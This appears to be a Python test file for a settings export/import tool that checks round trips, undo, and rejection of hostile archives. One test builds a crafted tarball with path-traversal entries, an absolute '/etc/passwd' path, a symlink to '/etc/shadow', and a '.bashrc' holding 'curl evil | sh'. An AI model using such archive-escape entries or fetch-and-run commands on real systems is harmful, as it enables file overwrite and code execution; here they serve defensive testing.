"""Take my setup with me: what goes in the file, what comes back, Undo, and files that try to escape."""
import io
import json
import os
import sys
import tarfile
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

sys.path[:0] = [str(Path(__file__).resolve().parents[1] / f'pkg/deckos-settings/rootfs/usr/lib/deckos/{d}')
                for d in ('setup', 'pulse')]
import setup  # noqa: E402


class SetupTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.root = Path(self.temp.name)
        self.old, self.new = self.root / 'old-pc', self.root / 'new-pc'
        for h in (self.old, self.new):
            h.mkdir()
        self.env = patch.dict(os.environ, {'DECKOS_SETUP_HOME': str(self.old),
                                           'DECKOS_PULSE_USER': str(self.root / 'u.jsonl'),
                                           'DECKOS_PULSE_SYSTEM': str(self.root / 's.jsonl')})
        self.env.start()

    def tearDown(self):
        self.env.stop()
        self.temp.cleanup()

    def put(self, home, rel, text):
        p = home / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(text)

    def test_round_trip_and_undo(self):
        self.put(self.old, '.config/kdeglobals', '[General]\nAccentColor=255,77,94\n')
        self.put(self.old, '.config/deckos/game-profiles.json', '{"42": {"power": "performance"}}')
        self.put(self.old, '.config/deckos/api-token', 'shh')  # never travels
        self.put(self.old, '.ssh/id_ed25519', 'private')  # not in WHAT: never travels
        bundle = self.root / 'setup.tar.gz'
        self.assertEqual(setup.export(bundle), 2)
        self.assertEqual(setup.show(bundle)['files'], ['.config/kdeglobals', '.config/deckos/game-profiles.json'])

        self.put(self.new, '.config/kdeglobals', '[General]\nAccentColor=76,141,255\n')
        os.environ['DECKOS_SETUP_HOME'] = str(self.new)
        stamp, n = setup.import_(bundle)
        self.assertEqual(n, 2)
        self.assertIn('255,77,94', (self.new / '.config/kdeglobals').read_text())
        self.assertTrue((self.new / '.config/deckos/game-profiles.json').exists())
        setup.undo(stamp)
        self.assertIn('76,141,255', (self.new / '.config/kdeglobals').read_text())  # the new PC's own, back
        self.assertFalse((self.new / '.config/deckos/game-profiles.json').exists())  # it was new: gone again

    def test_a_crafted_file_cant_escape_home(self):
        bundle = self.root / 'evil.tar.gz'
        with tarfile.open(bundle, 'w:gz') as tar:
            def add(name, data=b'x', kind=tarfile.REGTYPE, link=''):
                info = tarfile.TarInfo(name)
                info.size, info.type, info.linkname = (len(data) if kind == tarfile.REGTYPE else 0), kind, link
                tar.addfile(info, io.BytesIO(data) if kind == tarfile.REGTYPE else None)
            add('deckos-setup.json', json.dumps({'format': setup.FORMAT}).encode())
            add('home/../../escaped.txt')
            add('home/.config/deckos/../../../outside.txt')
            add('/etc/passwd')
            add('home/.bashrc', b'curl evil | sh')  # inside home, but not something a setup carries
            add('home/.config/deckos/link', kind=tarfile.SYMTYPE, link='/etc/shadow')
            add('home/.config/deckos/ok.conf', b'fine')
        os.environ['DECKOS_SETUP_HOME'] = str(self.new)
        _, n = setup.import_(bundle)
        self.assertEqual(n, 1)
        self.assertEqual((self.new / '.config/deckos/ok.conf').read_text(), 'fine')
        self.assertFalse((self.root / 'escaped.txt').exists())
        self.assertFalse((self.new / '.bashrc').exists())
        self.assertFalse((self.new / '.config/deckos/link').exists())

    def test_a_newer_format_is_refused(self):
        bundle = self.root / 'future.tar.gz'
        with tarfile.open(bundle, 'w:gz') as tar:
            data = json.dumps({'format': 99}).encode()
            info = tarfile.TarInfo('deckos-setup.json')
            info.size = len(data)
            tar.addfile(info, io.BytesIO(data))
        with self.assertRaises(ValueError):
            setup.import_(bundle)

    def test_undo_only_takes_its_own_backups(self):
        with self.assertRaises(ValueError):
            setup.undo('../../etc')


if __name__ == '__main__':
    unittest.main()
